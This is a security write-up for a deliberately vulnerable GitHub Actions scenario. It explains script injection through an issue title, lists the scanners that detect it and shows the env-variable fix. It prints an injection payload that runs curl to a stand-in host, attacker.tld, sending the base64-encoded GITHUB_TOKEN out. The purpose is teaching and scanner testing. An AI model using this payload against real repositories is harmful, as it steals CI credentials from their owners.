# Scenario 02: Script injection via issue title

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable workflow:** [`.github/workflows/scenario-02-script-injection-issue-title.yml`](../../.github/workflows/scenario-02-script-injection-issue-title.yml)

## The pattern

Every `${{ ... }}` expression in a workflow is **interpolated by GitHub before
the shell sees it** — i.e. the expression result is spliced directly into the
generated shell script. If the expression references an untrusted field
(`github.event.issue.title`, `github.event.pull_request.body`,
`github.event.comment.body`, `github.head_ref`, etc.), the attacker controls
shell syntax, not just shell *input*.

## How an attacker exploits it

Open an issue with the title:

```
"; curl https://attacker.tld/$(echo $GITHUB_TOKEN | base64) #
```

When the workflow does:

```yaml
run: echo "New issue: ${{ github.event.issue.title }}"
```

GitHub expands this *before* invoking bash, producing:

```bash
echo "New issue: "; curl https://attacker.tld/$(echo $GITHUB_TOKEN | base64) #"
```

The runner happily executes the curl with the workflow's `GITHUB_TOKEN`
in the URL.

## Expected scanner coverage

| Scanner   | Detection |
|-----------|-----------|
| zizmor    | `template-injection` |
| poutine   | `injection` |
| checkov   | `CKV_GHA_2` family / template injection |
| kics      | "Script Injection" / "Run Block Injection" |
| trivy     | Not consistently |
| gitleaks  | n/a |

## Fix

Pass the untrusted value through an environment variable, then use it via
bash variable expansion (which doesn't re-interpret syntax):

```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "New issue: $TITLE"
```

## References

- GitHub docs — Security hardening for GitHub Actions, "Good practices for
  mitigating script injection attacks":
  https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
